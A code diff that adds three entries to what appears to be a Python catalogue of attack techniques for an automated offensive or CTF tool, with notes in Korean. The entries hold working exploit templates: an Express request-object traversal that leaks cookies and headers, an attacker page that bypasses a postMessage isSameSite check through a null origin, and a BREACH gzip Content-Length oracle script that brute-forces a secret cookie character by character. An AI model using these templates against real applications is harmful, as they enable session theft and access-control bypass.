@@ -1355,6 +1355,183 @@ TECHNIQUES: list[dict] = [
             "tags": ["smtp", "content-id", "path-traversal", "arbitrary-file-write", "rce", "maildev", "node"],
         },
     },
+
+    # ── 23. Express req property traversal via search/getdata ──
+    {
+        "name": "express_req_property_traversal_leak",
+        "vuln_type": "information_disclosure",
+        "attack_metadata": {
+            "name": "Express req object property traversal — cookie/header leak",
+            "applies_when": (
+                "서버가 사용자 입력(key)과 Express req 객체를 getdata/resolve 형태 함수에 함께 넘길 때. "
+                "getdata(key, value, req) 형태에서 key = 'cookies.sessionId' 등으로 "
+                "req.cookies, req.headers, req.query 등 내부 속성에 접근 가능."
+            ),
+            "prerequisites": [
+                "서버 핸들러가 req 객체를 generic data resolver에 직접 전달",
+                "key가 dot(.) 또는 delimiter로 분리되어 재귀 접근",
+                "prototype/constructor blocklist에 cookies, headers 등이 빠져 있음",
+            ],
+            "technique_steps_md": (
+                "1. /search 등 엔드포인트의 data resolver 분석 — 3번째 인자가 `req`인지 확인\n"
+                "2. `getdata(key, value, data)` 에서 key에 dot-path 사용: `cookies.key`\n"
+                "3. `value='*'`이면 모든 하위 속성 열거, 특정 값이면 해당 키만 반환\n"
+                "4. 요청에 cookie 포함 시 → 응답에 `<p id=key>cookie_value</p>` 형태로 누출\n"
+                "5. headers, query, body 등 req의 다른 속성도 동일하게 접근 가능"
+            ),
+            "code_template": (
+                "import requests\n"
+                "# Leak all cookies\n"
+                "resp = requests.post('{url}/search',\n"
+                "    json={'query': {'cookies': '*'}},\n"
+                "    cookies={'key': 'secret_value'})\n"
+                "# Response: <p id=key>secret_value</p>\n\n"
+                "# Leak specific cookie char by char\n"
+                "resp = requests.post('{url}/search',\n"
+                "    json={'query': {'cookies.key': '*'}},\n"
+                "    cookies={'key': 'secret'})\n"
+                "# Response: <p id=0>s</p><p id=1>e</p>..."
+            ),
+            "examples": [{
+                "params": {
+                    "endpoint": "/search",
+                    "data_arg": "req (Express request object)",
+                    "leaked_property": "req.cookies.key",
+                    "key_payload": "cookies or cookies.key",
+                },
+                "notes": (
+                    "blocklist에 __proto__, prototype, constructor만 있고 "
+                    "cookies, headers, query 등은 차단하지 않음. "
+                    "value='*'이면 전체, 특정 key 지정이면 해당 값만 반환."
+                ),
+            }],
+            "tags": ["express", "req-traversal", "cookie-leak", "information-disclosure", "property-access"],
+        },
+    },
+
+    # ── 24. isSameSite null origin bypass ──
+    {
+        "name": "isamesite_null_origin_bypass",
+        "vuln_type": "access_control_bypass",
+        "attack_metadata": {
+            "name": "postMessage isSameSite check bypass via null origin",
+            "applies_when": (
+                "클라이언트 JS가 postMessage 수신 시 isSameSite(window.origin, e.origin) 검사를 하고, "
+                "isSameSite 구현이 origin.slice(7).split('.').slice(-2).join('.').endsWith(...) "
+                "형태일 때. data: URL, sandbox iframe, blob: URL 등에서 e.origin='null'이 되면 "
+                "'null'.slice(7)='' → endsWith('')=true 로 항상 통과."
+            ),
+            "prerequisites": [
+                "대상 페이지가 postMessage 이벤트 리스너에서 origin 검사 수행",
+                "isSameSite가 slice(7) + endsWith 패턴 사용",
+                "공격자가 data: URL 또는 sandboxed iframe에서 postMessage 전송 가능",
+            ],
+            "technique_steps_md": (
+                "1. 대상 페이지의 message event listener 분석 — isSameSite 로직 확인\n"
+                "2. `origin.slice(7)` → 'http://' 제거 의도지만, 'null'에서는 빈 문자열\n"
+                "3. `''.split('.').slice(-2).join('.')` = `''`\n"
+                "4. `anything.endsWith('')` = `true` — 항상 통과\n"
+                "5. 공격자 페이지에서 sandbox iframe + allow-same-origin으로 data: URL 로드\n"
+                "6. data: URL 내에서 window.open으로 대상 열고, iframe에 postMessage 전송\n"
+                "7. MessageChannel 포트 전달로 양방향 통신 확보"
+            ),
+            "code_template": (
+                "<!-- Attacker page -->\n"
+                "<iframe sandbox='allow-scripts allow-same-origin allow-popups'\n"
+                "  id='exploit'></iframe>\n"
+                "<script>\n"
+                "exploit.src = `data:text/html,<script>\n"
+                "  var w = window.open('{target_url}');\n"
+                "  setTimeout(() => {\n"
+                "    var mc = new MessageChannel();\n"
+                "    mc.port1.onmessage = (e) => { /* handle response */ };\n"
+                "    w[0].postMessage(1, '*', [mc.port2]);\n"
+                "  }, 1000);\n"
+                "<\\/script>`;\n"
+                "</script>"
+            ),
+            "examples": [{
+                "params": {
+                    "target_url": "http://frontend:8080/",
+                    "attacker_origin": "null (data: URL in sandbox iframe)",
+                    "bypass_reason": "'null'.slice(7)='' → endsWith('')=true",
+                },
+                "notes": (
+                    "sandbox iframe에 allow-same-origin 필요. "
+                    "MessageChannel로 양방향 통신 후 window 속성 설정(debug mode 등) 가능."
+                ),
+            }],
+            "tags": ["postmessage", "origin-bypass", "null-origin", "sandbox", "isamesite", "messagechannel"],
+        },
+    },
+
+    # ── 25. BREACH gzip compression side-channel ──
+    {
+        "name": "breach_gzip_compression_side_channel",
+        "vuln_type": "information_disclosure",
+        "attack_metadata": {
+            "name": "BREACH gzip compression side-channel for secret extraction",
+            "applies_when": (
+                "서버 응답이 gzip 압축되고, 같은 응답 안에 (1) secret 값(쿠키 등)과 "
+                "(2) 공격자가 제어하는 텍스트가 함께 포함될 때. "
+                "추측 문자가 secret의 접두사와 일치하면 gzip이 더 효율적으로 압축 "
+                "→ Content-Length가 더 작아짐 → 1문자씩 brute-force 가능."
+            ),
+            "prerequisites": [
+                "응답에 gzip/deflate 압축 적용 (flask-compress, nginx gzip 등)",
+                "응답에 secret(cookie 값 등)이 반사(reflection)됨",
+                "공격자가 같은 응답에 임의 텍스트를 삽입 가능",
+                "Content-Length를 관측할 수 있는 오라클 존재 (debug mode, timing 등)",
+            ],
+            "technique_steps_md": (
+                "1. 응답에 secret이 포함되는 엔드포인트 식별 (예: /search에서 cookies 반사)\n"
+                "2. 같은 응답에 추측 문자열 삽입 — 예: query에 'cookies.*' + '<p id=key>token{s' 동시 전달\n"
+                "3. gzip 압축 후 Content-Length 비교:\n"
+                "   - 올바른 접두사: '<p id=key>token{s'가 실제 '<p id=key>token{s3cr3t...'와 겹침 → 더 작은 CL\n"
+                "   - 틀린 접두사: '<p id=key>token{x'는 겹치지 않음 → 더 큰 CL\n"
+                "4. Δ(Content-Length) 보통 1-3바이트 차이로 식별 가능\n"
+                "5. padding(\\x01 * N)으로 압축 컨텍스트 확장하여 oracle 정확도 향상\n"
+                "6. 알파벳 순회하며 한 글자씩 추출, 추출된 prefix에 다음 글자 추가 반복"
+            ),
+            "code_template": (
+                "import requests\n\n"
+                "pad = '\\x01' * 1000\n"
+                "extracted = ''\n"
+                "charset = 'abcdefghijklmnopqrstuvwxyz0123456789_{}!@'\n\n"
+                "for pos in range(32):\n"
+                "    best_char, best_cl = None, float('inf')\n"
+                "    for c in charset:\n"
+                "        prefix = extracted + c\n"
+                "        query = {{\n"
+                "            'cookies': '*',\n"
+                "            f'cookies.{{pad}}<p id=key>{{prefix}}': '*',\n"
+                "        }}\n"
+                "        resp = requests.post('{frontend_url}/search',\n"
+                "            json={{'query': query}},\n"
+                "            cookies={{'key': secret_cookie}})\n"
+                "        cl = int(resp.headers['Content-Length'])\n"
+                "        if cl < best_cl:\n"
+                "            best_cl = cl; best_char = c\n"
+                "    extracted += best_char"
+            ),
+            "examples": [{
+                "params": {
+                    "compression": "flask-compress gzip (COMPRESS_MIN_SIZE=500)",
+                    "secret_location": "req.cookies.key reflected via /search",
+                    "oracle": "Content-Length header via debug mode + MessageChannel",
+                    "padding": "\\x01 * 1000",
+                    "delta": "2 bytes per correct character",
+                },
+                "notes": (
+                    "Flask-compress 기본 최소 크기 500바이트 — 응답이 충분히 커야 gzip 적용. "
+                    "user data 함께 조회하여 임계값 초과. "
+                    "debug mode(window.debug.param='Content-Length')로 "
+                    "fetch response header를 MessageChannel로 전달받아 oracle 구성."
+                ),
+            }],
+            "tags": ["breach", "compression-oracle", "gzip", "side-channel", "content-length", "cookie-extraction"],
+        },
+    },
 ]
 
 
